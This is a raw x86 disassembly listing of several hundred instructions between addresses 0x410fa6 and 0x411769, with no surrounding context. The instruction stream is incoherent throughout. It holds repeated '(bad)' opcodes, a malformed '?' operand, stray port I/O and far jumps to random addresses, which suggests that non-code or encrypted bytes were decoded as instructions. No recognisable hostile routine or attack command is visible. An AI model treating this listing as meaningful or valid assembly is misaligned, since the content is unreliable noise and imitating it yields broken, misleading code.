  410fa6:	out    0x6f,al
  410fa8:	mov    WORD PTR [ecx+esi*8+0x6a],cs
  410fac:	daa    
  410fad:	add    eax,0x2b6522c8
  410fb2:	pop    ebx
  410fb3:	ss pusha 
  410fb5:	xor    al,0xe9
  410fb7:	pop    ss
  410fb8:	or     edi,ebx
  410fba:	mov    DWORD PTR [ecx+0xff98143],esp
  410fc0:	jecxz  0x410fc5
  410fc2:	(bad)  
  410fc4:	mov    ebx,0xac14d773
  410fc9:	pop    ds
  410fca:	or     eax,0x7188ae69
  410fcf:	aad    0x23
  410fd1:	mov    cl,0x8b
  410fd3:	push   ds
  410fd4:	add    BYTE PTR [eax+eax*1],ch
  410fd7:	or     ecx,esi
  410fd9:	cmp    bl,dh
  410fdb:	cmp    BYTE PTR [edx],cl
  410fdd:	stos   DWORD PTR es:[edi],eax
  410fde:	loope  0x410f7d
  410fe0:	(bad)  [ecx]
  410fe2:	pop    edi
  410fe3:	pop    ds
  410fe4:	shl    BYTE PTR [esi],cl
  410fe6:	mov    esi,0x2d4caf80
  410feb:	or     al,0x36
  410fed:	inc    esi
  410fee:	jb     0x410fe0
  410ff0:	test   al,0x9f
  410ff2:	movhps xmm4,QWORD PTR [ebx+ebp*4+0x35]
  410ff7:	mov    ebp,0xf388cfb3
  410ffc:	dec    ecx
  410ffd:	lahf   
  410ffe:	add    al,BYTE PTR [edi]
  411000:	rcl    al,0x87
  411003:	mov    ecx,DWORD PTR [eax]
  411005:	inc    ebp
  411006:	xor    al,0xa2
  411008:	mov    ecx,0x6d555a78
  41100d:	inc    ecx
  41100e:	out    dx,al
  41100f:	mov    eax,0x40ca2a9b
  411014:	pop    edi
  411015:	dec    edx
  411016:	cld    
  411017:	inc    ebp
  411018:	mov    dh,0x4f
  41101a:	out    dx,eax
  41101b:	pop    esi
  41101c:	mov    al,ds:0x778cc499
  411021:	fdivr  DWORD PTR [esi]
  411023:	pop    edx
  411024:	dec    ecx
  411025:	sahf   
  411026:	ins    BYTE PTR es:[edi],dx
  411027:	adc    eax,0x348dd809
  41102c:	loopne 0x411009
  41102e:	push   ss
  41102f:	and    dl,BYTE PTR [ecx+0x4843ba23]
  411035:	or     BYTE PTR es:[ebx+0x7cbcf962],dh
  41103c:	jno    0x410fcb
  41103e:	add    DWORD PTR [esi+0x18],0x26361ffa
  411045:	mov    ebp,0xcaf852e8
  41104a:	std    
  41104b:	das    
  41104c:	cmp    DWORD PTR [ecx-0x5c4597fe],esp
  411052:	je     0x41106e
  411054:	add    DWORD PTR [ebp+0x75],ebx
  411057:	and    ecx,edx
  411059:	ss clc 
  41105b:	add    eax,DWORD PTR [edx-0x10fd2b87]
  411061:	sub    DWORD PTR ds:0xabd38bf9,ebp
  411067:	or     edi,DWORD PTR [eax]
  411069:	out    dx,eax
  41106a:	call   0x8126:0x401f6af
  411071:	das    
  411072:	or     DWORD PTR ss:[edx],0xffffffec
  411076:	pop    ss
  411077:	mov    BYTE PTR [ecx-0x57],cl
  41107a:	fs jne 0x411029
  41107d:	inc    eax
  41107e:	jle    0x411065
  411080:	sbb    eax,ebx
  411082:	add    al,0x8
  411084:	mov    dh,0xd5
  411086:	pop    es
  411087:	sub    al,0x28
  411089:	outs   dx,DWORD PTR ds:[esi]
  41108a:	pop    ss
  41108b:	cli    
  41108c:	scas   al,BYTE PTR es:[edi]
  41108d:	mov    dl,0x6c
  41108f:	imul   esi,DWORD PTR [esi],0xffffffbd
  411092:	cmc    
  411093:	xor    DWORD PTR [edx-0xdb3d6dd],esp
  411099:	mov    esp,0x9379db97
  41109e:	adc    ecx,eax
  4110a0:	loope  0x4110bb
  4110a2:	cmp    BYTE PTR ds:0x958e9b03,ah
  4110a8:	sbb    ecx,DWORD PTR [ecx-0x18]
  4110ab:	jae    0x4110af
  4110ad:	pop    edi
  4110ae:	xchg   esp,eax
  4110b0:	stos   DWORD PTR es:[edi],eax
  4110b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4110b2:	push   edx
  4110b3:	push   esi
  4110b4:	mov    al,0x3c
  4110b6:	aas    
  4110b7:	push   cs
  4110b8:	stos   BYTE PTR es:[edi],al
  4110b9:	ins    DWORD PTR es:[edi],dx
  4110ba:	ret    
  4110bb:	out    0x80,eax
  4110bd:	lods   al,BYTE PTR ds:[esi]
  4110be:	xchg   ebp,eax
  4110c0:	addr16 aaa 
  4110c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4110c3:	repz or eax,0x816595ce
  4110c9:	jmp    0x411136
  4110cb:	mov    ecx,0xc7955bb7
  4110d0:	loope  0x41110a
  4110d2:	xor    DWORD PTR [ebx+0x46],edi
  4110d5:	imul   ecx,DWORD PTR [edi+0x430412dc],0xffffff96
  4110dc:	fs daa 
  4110de:	mov    esp,0x22334c8f
  4110e3:	popa   
  4110e4:	xlat   BYTE PTR ds:[ebx]
  4110e5:	fldenv [edx-0x7c]
  4110e8:	mov    esp,DWORD PTR [eax-0x5ce778ca]
  4110ee:	xor    DWORD PTR [ebx-0x5bbac7e9],eax
  4110f4:	xchg   BYTE PTR [ecx+0x5b],bh
  4110f7:	and    DWORD PTR [eax+edi*4+0x1],ebp
  4110fb:	int    0xce
  4110fd:	jl     0x4110b8
  4110ff:	xchg   esp,eax
  411100:	aad    0x78
  411102:	mov    DWORD PTR [ecx+eax*8],eax
  411105:	nop
  411106:	and    DWORD PTR [eax+ebx*2+0x471023a],ebx
  41110d:	repz call 0x6915:0x6be156f9
  411115:	or     edi,ebp
  411117:	mov    ch,0xf7
  411119:	je     0x411157
  41111b:	ret    
  41111c:	mov    cl,al
  41111e:	mov    esi,0x142e1a95
  411123:	es pop es
  411125:	js     0x411152
  411127:	(bad)  
  411129:	push   ds
  41112a:	xchg   edi,eax
  41112b:	add    bh,BYTE PTR [esi]
  41112d:	(bad)  
  41112e:	mov    eax,0xf41376f4
  411133:	test   eax,0x5c6c6817
  411138:	enter  0x6adc,0x94
  41113c:	fisubr WORD PTR [ecx-0x7c]
  41113f:	add    eax,0x447acebe
  411144:	ins    DWORD PTR es:[edi],dx
  411145:	sub    eax,0x4ad24707
  41114a:	cmc    
  41114b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41114c:	add    BYTE PTR [edi],bh
  41114e:	sub    al,0xf9
  411150:	mov    ebx,eax
  411152:	mov    ds,WORD PTR [edi+0x6cfee48a]
  411158:	stos   DWORD PTR es:[edi],eax
  411159:	call   0xddc1f181
  41115e:	dec    esi
  41115f:	adc    BYTE PTR gs:[esi],0xf2
  411163:	or     DWORD PTR [ebp-0x19],esp
  411166:	(bad)  
  411167:	popf   
  411168:	loop   0x411148
  41116a:	fwait
  41116b:	xchg   ebx,eax
  41116c:	cmp    bh,BYTE PTR [ebx+0x2c1b9e1b]
  411172:	jmp    0xab79:0x881246d
  411179:	push   esp
  41117a:	dec    edx
  41117b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41117c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41117d:	jne    0x41111b
  41117f:	out    0x5f,eax
  411181:	pop    edx
  411182:	inc    edx
  411183:	dec    esp
  411184:	pusha  
  411185:	sub    eax,0x628d37e0
  41118a:	mov    cl,0x94
  41118c:	sbb    DWORD PTR [ecx],edi
  41118e:	(bad)
  411191:	sub    al,0x53
  411193:	or     DWORD PTR [eax-0xa],ecx
  411196:	sti    
  411197:	xchg   DWORD PTR [edx-0x60ddfa76],edi
  41119d:	xor    dh,BYTE PTR [esi-0x6d1d838a]
  4111a3:	mov    ch,0x3f
  4111a5:	mov    es,esp
  4111a7:	ret    
  4111a8:	mov    ds,ecx
  4111aa:	add    ebp,ecx
  4111ac:	je     0x41113c
  4111ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4111af:	test   al,0x7e
  4111b1:	inc    edi
  4111b2:	pop    ss
  4111b3:	std    
  4111b4:	sbb    dh,BYTE PTR [eax-0x7dc14751]
  4111ba:	fimul  DWORD PTR [eax+0x20]
  4111bd:	xacquire xchg BYTE PTR [edi],ch
  4111c0:	push   0x713fa6ba
  4111c5:	push   eax
  4111c6:	sbb    al,0x6d
  4111c8:	jge    0x411181
  4111ca:	popf   
  4111cb:	sbb    DWORD PTR [eax+0x3d],eax
  4111ce:	jnp    0x41115b
  4111d0:	and    al,0x26
  4111d2:	das    
  4111d3:	popf   
  4111d4:	jnp    0x4111ae
  4111d6:	out    0x50,al
  4111d8:	push   ds
  4111d9:	add    BYTE PTR [edx-0x11765d80],ch
  4111df:	push   es
  4111e0:	ret    
  4111e1:	jecxz  0x411238
  4111e3:	pop    esp
  4111e4:	xor    dh,BYTE PTR [ebp+0x25]
  4111e7:	add    eax,0x3c70ad7f
  4111ec:	sub    al,0xe9
  4111ee:	or     DWORD PTR [edi-0x7b],ebp
  4111f1:	leave  
  4111f2:	xor    ebp,DWORD PTR [ebx]
  4111f4:	dec    ebx
  4111f5:	stos   BYTE PTR es:[edi],al
  4111f6:	js     0x411272
  4111f8:	dec    ebp
  4111f9:	aad    0xda
  4111fb:	xchg   esi,eax
  4111fc:	and    BYTE PTR [esi+eax*1],bl
  4111ff:	iret   
  411200:	add    ebx,DWORD PTR [ecx-0x14]
  411203:	adc    eax,0x6e5d56c3
  411208:	and    eax,0x831a0931
  41120d:	jo     0x411215
  41120f:	shr    BYTE PTR [ecx-0x29],cl
  411212:	pop    ebp
  411213:	pop    es
  411214:	jo     0x4111ca
  411216:	xchg   edx,eax
  411217:	mov    ds:0xecfd9f90,eax
  41121c:	aam    0xa0
  41121e:	lock and ah,dh
  411221:	fwait
  411222:	jno    0x4111ef
  411224:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411225:	mov    ds:0x1149cb59,al
  41122a:	lds    ebx,FWORD PTR [edx-0x7e990a54]
  411230:	cdq    
  411231:	shl    DWORD PTR fs:[esp+edi*8-0x60],cl
  411236:	loope  0x411201
  411238:	pop    ecx
  411239:	call   0x3a0f:0x4710902
  411240:	in     eax,dx
  411241:	add    eax,0x5631ca03
  411246:	inc    ebp
  411247:	out    dx,eax
  411248:	or     al,0xcc
  41124a:	cwde   
  41124b:	push   cs
  41124c:	sbb    ebx,DWORD PTR [edi-0x1f72daa1]
  411252:	hlt    
  411253:	and    edi,esi
  411255:	fcom   QWORD PTR [ecx+ebx*4+0x49]
  411259:	scas   al,BYTE PTR es:[edi]
  41125a:	xchg   esi,eax
  41125b:	stos   BYTE PTR es:[edi],al
  41125c:	out    0x45,eax
  41125e:	test   DWORD PTR [esi+0x40],esi
  411261:	jp     0x41122a
  411263:	call   FWORD PTR [ebx-0x17d278c3]
  411269:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41126a:	fisub  DWORD PTR [ebx-0x34b799b4]
  411270:	test   DWORD PTR ds:0xa466a7a7,esp
  411276:	xchg   edi,eax
  411277:	mov    edx,0x70396473
  41127c:	arpl   WORD PTR [bp+0x9],di
  411280:	shl    ch,0xd8
  411283:	mov    edi,0x1575f30
  411288:	nop
  411289:	mov    WORD PTR [ecx-0x19],?
  41128c:	pop    ebx
  41128d:	inc    ebp
  41128e:	fwait
  41128f:	into   
  411290:	fidivr DWORD PTR [ebx-0x5c5a981f]
  411296:	or     edx,DWORD PTR [edi+0x7df87ff7]
  41129c:	dec    edx
  41129d:	rol    DWORD PTR [esi],0x8b
  4112a0:	mov    DWORD PTR [edx-0x2a90c2f0],ecx
  4112a6:	in     al,0xd4
  4112a8:	cmp    DWORD PTR [eax+0x74],0x6f020070
  4112af:	test   eax,0xea923f65
  4112b4:	xor    ebp,edi
  4112b6:	addr16 push ecx
  4112b8:	data16 add al,0xe6
  4112bb:	jp     0x411275
  4112bd:	fs cld 
  4112bf:	fst    DWORD PTR cs:[eax]
  4112c2:	aad    0xdc
  4112c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4112c5:	push   ecx
  4112c6:	dec    ebx
  4112c7:	sbb    esi,DWORD PTR [esi]
  4112c9:	test   al,0xca
  4112cb:	or     edi,DWORD PTR [edx+edx*8]
  4112ce:	push   esp
  4112cf:	pop    edi
  4112d0:	aas    
  4112d1:	mov    cs,edx
  4112d3:	pop    eax
  4112d4:	in     eax,dx
  4112d5:	push   ss
  4112d6:	test   eax,0x3624dd6
  4112db:	and    dl,BYTE PTR [esi+0xe]
  4112de:	sbb    al,0x3b
  4112e0:	push   ecx
  4112e1:	in     al,0x2
  4112e3:	lods   al,BYTE PTR ds:[esi]
  4112e4:	aam    0x23
  4112e6:	fbstp  TBYTE PTR [eax]
  4112e8:	xor    esi,DWORD PTR [esi]
  4112ea:	xchg   ebx,eax
  4112eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4112ec:	sub    al,0x11
  4112ee:	cli    
  4112ef:	pop    ds
  4112f0:	sbb    al,0x9f
  4112f2:	imul   ebx,DWORD PTR [esi],0x73b8f092
  4112f8:	shl    BYTE PTR [esi+0xd],cl
  4112fb:	push   edx
  4112fd:	mov    ebx,esi
  4112ff:	add    BYTE PTR [ebx-0x41],dl
  411302:	js     0x4112da
  411304:	sub    dh,BYTE PTR [edi]
  411306:	jnp    0x411331
  411308:	repnz cmp bl,BYTE PTR [ecx+0x209a5448]
  41130f:	or     BYTE PTR [esp+esi*4+0x17],dh
  411313:	add    DWORD PTR [esi],0x1ea5e81a
  411319:	jecxz  0x41133a
  41131b:	xchg   edi,eax
  41131c:	ins    BYTE PTR es:[edi],dx
  41131d:	test   BYTE PTR [ecx+0x2275d96b],bh
  411323:	out    dx,al
  411324:	inc    edi
  411325:	test   DWORD PTR [esi-0x1f],eax
  411328:	mov    WORD PTR [edi-0x166998bd],cs
  41132e:	mov    ebp,0xf1bcda9e
  411333:	nop
  411334:	(bad)  [ecx+0x8ff332f]
  41133a:	adc    DWORD PTR [ebp+0x3f9cfc2f],ecx
  411340:	jo     0x4113b5
  411342:	xchg   esi,eax
  411343:	popf   
  411344:	out    dx,al
  411345:	xchg   ebx,eax
  411346:	add    edx,DWORD PTR [eax]
  411348:	mov    ebp,DWORD PTR [esi]
  41134a:	scas   al,BYTE PTR es:[edi]
  41134b:	nop
  41134c:	cmc    
  41134d:	jmp    0x869f:0x77bc417b
  411354:	dec    eax
  411355:	add    eax,0xcc956a53
  41135a:	call   0x8e6b:0x5e061f53
  411361:	popa   
  411362:	dec    ecx
  411363:	cmp    ebp,esp
  411365:	mov    esp,0xb3c7a32
  41136a:	mov    eax,0xb915ba6a
  41136f:	shl    BYTE PTR [edx-0x5c54b982],cl
  411375:	(bad)  
  411376:	(bad)  
  411377:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411378:	push   0x20f4a57c
  41137d:	sub    bh,cl
  41137f:	mov    WORD PTR [eax+0x31],es
  411382:	cs jmp 0x5529ab77
  411388:	pop    ds
  411389:	mov    ah,0x1b
  41138b:	xchg   ebx,eax
  41138c:	pushf  
  41138d:	popf   
  41138e:	imul   ebx,DWORD PTR [edx],0x3c
  411391:	inc    esi
  411392:	sub    BYTE PTR [esp+edx*8-0x77],ah
  411396:	jmp    0x4113fe
  411398:	or     al,0x32
  41139a:	stos   BYTE PTR es:[edi],al
  41139b:	test   al,0xf9
  41139d:	add    dl,ah
  41139f:	or     esi,DWORD PTR [esi]
  4113a1:	cmc    
  4113a2:	retf   
  4113a3:	push   cs
  4113a4:	arpl   WORD PTR [edx+edx*8-0x4b],bp
  4113a8:	and    al,0x3
  4113aa:	jbe    0x41134f
  4113ac:	addr16 add al,cl
  4113af:	pop    ss
  4113b0:	mov    ebx,0x6527ae29
  4113b5:	inc    ebp
  4113b6:	and    ebp,esp
  4113b8:	inc    edi
  4113b9:	jmp    0xb47d98c1
  4113be:	nop
  4113bf:	push   edx
  4113c0:	xchg   ecx,eax
  4113c1:	ds dec eax
  4113c3:	xlat   BYTE PTR ds:[ebx]
  4113c4:	mov    ds:0xc9c64620,eax
  4113c9:	addr16 call 0x9ee5b257
  4113cf:	test   eax,0xa794905c
  4113d4:	xchg   edi,eax
  4113d5:	mov    eax,0x58f0c66c
  4113da:	inc    ebx
  4113db:	cwde   
  4113dc:	inc    esi
  4113dd:	or     BYTE PTR [esi-0x29],bl
  4113e0:	sar    BYTE PTR [eax-0x12],cl
  4113e3:	inc    ebx
  4113e4:	aad    0x92
  4113e6:	mov    esp,0x6c970e5
  4113eb:	push   ds
  4113ec:	mov    ah,0xe3
  4113ee:	neg    BYTE PTR [eax+0x5b665ac3]
  4113f4:	neg    esi
  4113f6:	ss sti 
  4113f8:	int    0xb7
  4113fa:	cmp    eax,0xdc9498ad
  4113ff:	out    0x6e,eax
  411401:	out    0x33,eax
  411403:	adc    eax,0x70435fb8
  411408:	sbb    al,0x92
  41140a:	test   DWORD PTR [ebx+0xe02abbb],0x131f0468
  411414:	sub    DWORD PTR [edx],0x2056bf38
  41141a:	ucomiss xmm3,DWORD PTR [edi]
  41141d:	lods   al,BYTE PTR ds:[esi]
  41141e:	shr    BYTE PTR [edx],0x3a
  411421:	pop    es
  411422:	sbb    al,0xbb
  411424:	jl     0x411407
  411426:	push   ecx
  411427:	test   eax,0x6d498215
  41142c:	(bad)  
  41142d:	fcmovne st,st(7)
  41142f:	push   edx
  411430:	pushf  
  411431:	arpl   WORD PTR [eax-0x27],sp
  411434:	mov    al,bh
  411436:	in     eax,dx
  411437:	mov    BYTE PTR [esi+0x35],0xe7
  41143b:	dec    eax
  41143c:	cmp    esp,DWORD PTR [edx]
  41143e:	enter  0x3af9,0x4d
  411442:	aad    0xc4
  411444:	daa    
  411445:	cmp    edx,DWORD PTR ds:0xb74aec8d
  41144b:	jmp    0x4114c7
  41144d:	pop    esp
  41144e:	loope  0x411407
  411450:	leave  
  411451:	(bad)  
  411452:	cmc    
  411453:	xor    ecx,edx
  411455:	fadd   DWORD PTR ds:0xddcf4b0f
  41145b:	ins    BYTE PTR es:[edi],dx
  41145c:	ds dec edx
  41145e:	mov    bh,0x55
  411460:	ins    BYTE PTR es:[edi],dx
  411461:	es mov ax,0x2d89
  411466:	push   cs
  411467:	dec    esi
  411468:	pusha  
  411469:	inc    esp
  41146a:	outs   dx,BYTE PTR ds:[esi]
  41146b:	xchg   esi,eax
  41146c:	gs stos DWORD PTR es:[edi],eax
  41146e:	(bad)  [ebp-0x64]
  411471:	adc    eax,0x22e9605c
  411476:	push   edi
  411477:	jecxz  0x411447
  411479:	mov    dh,0xe
  41147b:	or     DWORD PTR [eax-0x6ea3f40b],ebx
  411481:	dec    ecx
  411482:	fidiv  DWORD PTR [ebx+0x313bc01b]
  411488:	push   edi
  411489:	sahf   
  41148a:	(bad)  
  41148b:	loope  0x41144a
  41148d:	(bad)  
  41148e:	sbb    DWORD PTR [edx+0x39],eax
  411491:	popa   
  411492:	jne    0x41149e
  411494:	jle    0x41150e
  411496:	sahf   
  411497:	xchg   ecx,eax
  411498:	clc    
  411499:	ss push ebx
  41149b:	push   edx
  41149c:	cmp    BYTE PTR [edx-0x2e5683ad],0x70
  4114a3:	push   0xee8e211
  4114a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4114a9:	pusha  
  4114aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4114ab:	xor    al,0x25
  4114ad:	in     eax,0xb4
  4114af:	jmp    0x1aa6ecc1
  4114b4:	xchg   esi,eax
  4114b5:	jl     0x4114e9
  4114b7:	(bad)  
  4114b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4114b9:	sub    DWORD PTR cs:[edi+0x56],0xfffffff4
  4114be:	push   0x6
  4114c0:	mov    ch,BYTE PTR es:[ecx+0x5426b72a]
  4114c7:	ror    BYTE PTR [edx-0x49],cl
  4114ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4114cb:	loop   0x4114f9
  4114cd:	add    DWORD PTR [esi],esp
  4114cf:	stos   BYTE PTR es:[edi],al
  4114d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4114d1:	pop    ebp
  4114d3:	int3   
  4114d4:	push   ss
  4114d5:	pop    eax
  4114d6:	scas   eax,DWORD PTR es:[edi]
  4114d7:	add    bl,BYTE PTR [edi+0x52]
  4114da:	es neg cl
  4114dd:	fsubr  st(6),st
  4114df:	fnstenv [eax+0x9251b61]
  4114e5:	sahf   
  4114e6:	xlat   BYTE PTR ds:[ebx]
  4114e7:	cwde   
  4114e8:	in     eax,0xcd
  4114ea:	push   ds
  4114eb:	xor    cl,BYTE PTR [ecx-0x279f597a]
  4114f1:	(bad)  
  4114f2:	push   cs
  4114f3:	jecxz  0x411506
  4114f5:	cld    
  4114f6:	mov    edx,0xae70a7f4
  4114fb:	mov    BYTE PTR [edi-0x3f2533ce],dh
  411501:	out    0x41,al
  411503:	lods   eax,DWORD PTR ds:[esi]
  411504:	lds    ebp,FWORD PTR [ebx-0x1]
  411507:	adc    eax,0xeb9bc6d7
  41150c:	and    BYTE PTR [esi+0x28],al
  41150f:	push   ss
  411510:	call   0x81d0aa51
  411515:	retf   
  411516:	aas    
  411517:	sub    dl,BYTE PTR [ecx]
  411519:	pop    es
  41151a:	mov    edi,0xb9a191d0
  41151f:	inc    ebx
  411520:	add    dl,ah
  411522:	push   edx
  411523:	xchg   esp,eax
  411524:	out    dx,al
  411525:	push   ecx
  411526:	jne    0x411528
  411528:	pop    ds
  411529:	push   esp
  41152a:	cld    
  41152b:	pop    edi
  41152c:	sbb    al,0x6
  41152e:	and    BYTE PTR [ebx-0xce780f7],al
  411534:	xchg   DWORD PTR [ebx-0x69fe4842],edx
  41153a:	dec    edi
  41153b:	out    dx,eax
  41153c:	mov    esp,0xe28bfcf8
  411541:	cdq    
  411542:	std    
  411543:	sti    
  411544:	xor    ah,BYTE PTR [ecx-0x4a]
  411547:	div    BYTE PTR [eax+0x7ae48f1c]
  41154d:	cmp    bh,0xb8
  411550:	jge    0x411577
  411552:	test   DWORD PTR ds:0xa39c3f28,ecx
  411558:	and    dh,0xdc
  41155b:	adc    eax,0x26ec6018
  411560:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411561:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411562:	ficom  WORD PTR [esi]
  411564:	(bad)  
  411565:	xor    eax,0xd748a3ff
  41156a:	lea    esi,[esi-0x514e7b6d]
  411570:	clc    
  411571:	jns    0x4115f2
  411573:	cmp    ah,BYTE PTR [edx]
  411575:	pop    ss
  411576:	sar    DWORD PTR [ebp+esi*4+0x8],1
  41157a:	out    0xff,eax
  41157c:	pop    ds
  41157d:	(bad)  
  41157e:	cmc    
  41157f:	call   0x9784cb1b
  411584:	jecxz  0x4115eb
  411586:	(bad)  
  411587:	pop    ecx
  411588:	and    eax,0x3a573b52
  41158d:	test   DWORD PTR [ecx-0x1c],eax
  411590:	mov    edx,0x857adda5
  411595:	mov    esp,0xaa81dc2a
  41159a:	cli    
  41159b:	cdq    
  41159c:	pop    eax
  41159d:	jbe    0x411617
  41159f:	shl    BYTE PTR [eax],cl
  4115a1:	pop    eax
  4115a2:	pop    esp
  4115a3:	sub    BYTE PTR [edx],cl
  4115a5:	cmp    bh,dl
  4115a7:	mov    ebp,esp
  4115a9:	sbb    bl,BYTE PTR [ebx-0xc2b9c8b]
  4115af:	or     ebx,DWORD PTR [edx-0x3ae3191b]
  4115b5:	push   0x73
  4115b7:	xchg   ebp,eax
  4115b8:	call   0x1ea7:0xfb36e3b8
  4115bf:	sub    eax,0x6169384
  4115c4:	and    esi,DWORD PTR [edx+0x160c4d6c]
  4115ca:	pop    edi
  4115cb:	mov    al,bl
  4115cd:	push   0xffffffa0
  4115cf:	jns    0x411636
  4115d1:	imul   esi,edx,0x262a973b
  4115d7:	es jmp 0xc8d1cc7c
  4115dd:	pop    eax
  4115de:	xchg   esi,eax
  4115df:	push   0x44e9e07c
  4115e4:	xchg   edx,eax
  4115e5:	aas    
  4115e6:	les    edx,FWORD PTR [ebx+0x31e45d0d]
  4115ec:	inc    esi
  4115ed:	or     edx,esi
  4115ef:	add    DWORD PTR [esi],0xffffffc4
  4115f2:	les    edi,FWORD PTR [eax+0x12]
  4115f5:	js     0x4115bc
  4115f7:	or     dh,BYTE PTR [edi]
  4115f9:	inc    esp
  4115fa:	cmp    BYTE PTR [ebx],bh
  4115fc:	inc    ebx
  4115fd:	sub    ch,cl
  4115ff:	inc    esi
  411600:	jae    0x4115c4
  411602:	aaa    
  411603:	dec    esi
  411604:	pop    edx
  411605:	xchg   ebp,eax
  411606:	ret    0xaf5b
  411609:	or     ebx,esp
  41160b:	mov    edx,es
  41160d:	test   DWORD PTR [ebx-0x18fc3017],ecx
  411613:	test   DWORD PTR [ebx+0x5e4928e5],edi
  411619:	sbb    eax,0x4ea831f7
  41161e:	mov    bh,0xac
  411620:	mov    ch,0x3
  411622:	xor    eax,0xf624a505
  411627:	popa   
  411628:	inc    ebp
  411629:	ins    BYTE PTR es:[edi],dx
  41162a:	dec    esp
  41162b:	xor    cl,bh
  41162d:	cmp    edi,DWORD PTR [edi]
  41162f:	outs   dx,DWORD PTR ds:[esi]
  411630:	mov    dl,0x10
  411632:	push   eax
  411633:	retf   0x7ab0
  411636:	lahf   
  411637:	add    BYTE PTR [ebx-0x4e9edfcf],ch
  41163d:	test   dh,cl
  41163f:	rcr    BYTE PTR [esi+0x34],1
  411642:	push   0x18f0caa2
  411647:	call   0x7153bc07
  41164c:	dec    ebp
  41164d:	retf   
  41164e:	jb     0x4116ae
  411650:	mov    bh,ch
  411652:	scas   al,BYTE PTR es:[edi]
  411653:	pop    ebp
  411654:	arpl   WORD PTR [edx+0x15],bp
  411657:	jmp    0x41163a
  411659:	jp     0x411607
  41165b:	scas   eax,DWORD PTR es:[edi]
  41165c:	cmp    eax,0x67151e6c
  411661:	lahf   
  411662:	stos   BYTE PTR es:[edi],al
  411663:	mov    ch,0x9d
  411665:	popa   
  411666:	ret    0xd473
  411669:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41166a:	dec    esi
  41166b:	cmp    DWORD PTR [esi+0x702ff4b1],ebx
  411671:	sub    cl,BYTE PTR [ebx]
  411673:	ja     0x411667
  411675:	pop    edi
  411676:	rol    BYTE PTR [ebp-0x5a744a35],1
  41167c:	int    0x78
  41167e:	shl    DWORD PTR ds:0xad4d7615,cl
  411684:	scas   al,BYTE PTR es:[edi]
  411685:	int3   
  411686:	xchg   ebp,eax
  411687:	pop    ecx
  411688:	data16 (bad) 
  41168a:	mov    edi,0x859631f
  41168f:	fisubr DWORD PTR [ecx+0x39041fe3]
  411695:	or     DWORD PTR [ebp-0x71],0x4c
  411699:	sub    al,0xae
  41169b:	icebp  
  41169c:	jle    0x411670
  41169e:	jmp    0x79dd59ac
  4116a3:	inc    esi
  4116a4:	dec    esp
  4116a5:	inc    ebp
  4116a6:	push   ebp
  4116a7:	dec    edi
  4116a8:	mov    eax,ds:0x6d39601a
  4116ad:	loopne 0x411668
  4116af:	cmp    BYTE PTR ds:0x38c979b2,dh
  4116b5:	or     al,0xd9
  4116b7:	xchg   DWORD PTR [esi-0x3a3cbb86],eax
  4116bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4116be:	loop   0x411700
  4116c0:	push   es
  4116c1:	or     al,0x6f
  4116c3:	xchg   BYTE PTR [ecx-0x14],dh
  4116c6:	leave  
  4116c7:	cmp    BYTE PTR [edi],cl
  4116c9:	mov    edx,0xa51c25a8
  4116ce:	lahf   
  4116cf:	xchg   edi,eax
  4116d0:	ss fucomi st,st(6)
  4116d3:	sbb    DWORD PTR [ecx+edx*2+0x5f],esi
  4116d7:	push   esi
  4116d8:	push   es
  4116d9:	test   eax,eax
  4116db:	and    eax,0x50d62c4b
  4116e0:	cdq    
  4116e1:	(bad)  
  4116e3:	and    al,0x44
  4116e5:	adc    al,0xf1
  4116e7:	rcr    esi,0x5
  4116ea:	addr16 or al,0xa3
  4116ed:	pop    ebp
  4116ee:	cmp    DWORD PTR [ecx-0x71],esp
  4116f1:	icebp  
  4116f2:	scas   eax,DWORD PTR es:[edi]
  4116f3:	(bad)  [ebx-0x44b23e2f]
  4116f9:	out    0x40,al
  4116fb:	and    bh,dh
  4116fd:	mov    dh,0x5d
  4116ff:	test   al,0xd9
  411701:	mov    sp,WORD PTR [ebx+0x335b8004]
  411708:	push   ebx
  411709:	cmp    al,0xa0
  41170b:	pop    ds
  41170c:	and    al,0xb4
  41170e:	sbb    DWORD PTR [edi],esi
  411710:	jo     0x411742
  411712:	mov    esp,0x650b754
  411717:	lods   eax,DWORD PTR ds:[esi]
  411718:	fnstsw WORD PTR [ecx+0x19d7fcd8]
  41171e:	push   eax
  41171f:	imul   ebp,DWORD PTR [ebx],0xf8c07953
  411725:	iret   
  411726:	icebp  
  411727:	inc    ebp
  411728:	out    0xef,al
  41172a:	cmp    edx,DWORD PTR [ecx]
  41172c:	retf   0xfe6e
  41172f:	scas   al,BYTE PTR es:[edi]
  411730:	nop
  411731:	jmp    0xe1b6:0xd1e50933
  411738:	adc    BYTE PTR [ecx-0x3808979],0x1a
  41173f:	inc    esi
  411740:	sub    edx,DWORD PTR [ebp-0xdadfdf6]
  411746:	ins    BYTE PTR es:[edi],dx
  411747:	stc    
  411748:	call   0x8017dbeb
  41174d:	lea    esp,[edi]
  41174f:	jecxz  0x4116fe
  411751:	jge    0x41177a
  411753:	add    DWORD PTR [edx+0x649f7d5d],esi
  411759:	xchg   ebx,eax
  41175a:	xor    al,0x9
  41175c:	ds js  0x411765
  41175f:	jl     0x4117c7
  411761:	pop    eax
  411762:	jb     0x411728
  411764:	mov    eax,0x2fe7ffb8
  411769:	es or  ebp,DWORD PTR es:[eax-0x57d6b5f4]
